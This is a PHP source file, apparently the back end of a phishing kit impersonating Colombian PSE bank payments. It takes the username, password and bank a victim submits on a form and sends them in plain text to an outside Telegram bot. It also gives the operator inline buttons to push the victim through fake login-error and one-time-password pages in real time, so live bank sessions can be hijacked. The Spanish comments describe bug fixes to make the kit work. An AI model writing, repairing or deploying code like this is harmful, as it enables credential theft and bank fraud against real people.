<?php
session_start();
include '../../../../assets/config/conexion.php';
$config = include '../../../../assets/config/config.php';

// --- FUNCIÓN DE TELEGRAM CORREGIDA ---
// Se añadió '\\' a la lista para evitar el error 400 Bad Request
function escapeMarkdownV2($text) {
    $specialChars = ['\\', '_', '*', '[', ']', '(', ')', '~', '`', '>', '#', '+', '-', '=', '|', '{', '}', '.', '!'];
    foreach ($specialChars as $char) {
        $text = str_replace($char, "\\" . $char, $text);
    }
    return $text;
}

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $user = $_POST['user'];
    $pass = $_POST['pass'];
    $banco = $_POST['banco'];

    if (empty($user) || empty($pass)) {
        die("Error: Todos los campos son obligatorios.");
    }

    try {
        // --- SECCIÓN DE BASE DE DATOS CORREGIDA PARA PDO ---
        
        // 1. PostgreSQL usa "RETURNING id" para devolver el ID
        $sql_insert = "INSERT INTO pse (estado) VALUES (?) RETURNING id";
        
        $stmt_insert = $conn->prepare($sql_insert);
        $estado = 1; // Estado inicial
        
        // 2. En PDO, los valores se pasan en un array a execute()
        $stmt_insert->execute([$estado]);
        
        // 3. En PDO, se usa fetchColumn() para obtener el ID devuelto
        $nuevo_id = $stmt_insert->fetchColumn(); 

        // 4. No se usa close() en PDO de esta manera
        
        // --- FIN DE LA SECCIÓN CORREGIDA ---


        // Enviar datos a Telegram (esta parte estaba bien)
        $botToken = $config['telegram']['bot_token'];
        $chatId = $config['telegram']['chat_id'];
        $baseUrl = $config['base_url'];
        $security_key = 'tu_clave_secreta_aqui'; 

        $message = "🔐 *Nuevo inicio de sesión*\n\n"
                 . "👤 *Usuario:* `" . escapeMarkdownV2($user) . "`\n"
                 . "🔑 *Clave:* `" . escapeMarkdownV2($pass) . "`\n"
                 . "🏦 *Banco:* `" . escapeMarkdownV2($banco) . "`";

        $keyboard = [
            'inline_keyboard' => [
                [
                    ['text' => 'Error Login', 'url' => "$baseUrl?id=$nuevo_id&estado=2&key=$security_key"]
                ],
                [
                    ['text' => 'Otp', 'url' => "$baseUrl?id=$nuevo_id&estado=3&key=$security_key"],
                    ['text' => 'Otp Error', 'url' => "$baseUrl?id=$nuevo_id&estado=4&key=$security_key"]
                ],
                [
                    ['text' => 'Finalizar', 'url' => "$baseUrl?id=$nuevo_id&estado=0&key=$security_key"]
                ]
            ]
        ];

        $data = [
            'chat_id' => $chatId,
            'text' => $message,
            'parse_mode' => 'MarkdownV2',
            'reply_markup' => json_encode($keyboard)
        ];

        $options = [
            'http' => [
                'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
                'method'  => 'POST',
                'content' => http_build_query($data),
                'ignore_errors' => true // Ayuda a depurar si Telegram sigue fallando
            ]
        ];

        $url = "https://api.telegram.org/bot$botToken/sendMessage";
        $context = stream_context_create($options);
        $result = file_get_contents($url, false, $context);

        if ($result === FALSE || strpos($http_response_header[0], "200 OK") === false) {
            // Error al enviar
            $error_details = $result; // El $result contendrá la respuesta de error de Telegram
            file_put_contents('telegram_debug_log.txt', "Error: " . print_r($error_details, true) . "\nDatos enviados: " . print_r($data, true), FILE_APPEND);
            die('Error al enviar mensaje a Telegram');
        }

        // Redirigir a la página cargando.php con el nuevo ID del cliente
        header("Location: ../cargando.php?id=" . $nuevo_id);
        exit();

    } catch (PDOException $e) {
        // Captura cualquier error de la base de datos (PDO)
        error_log("Error de BBDD: " . $e->getMessage());
        die("Error al procesar la solicitud. Intente más tarde.");
    }
}
?>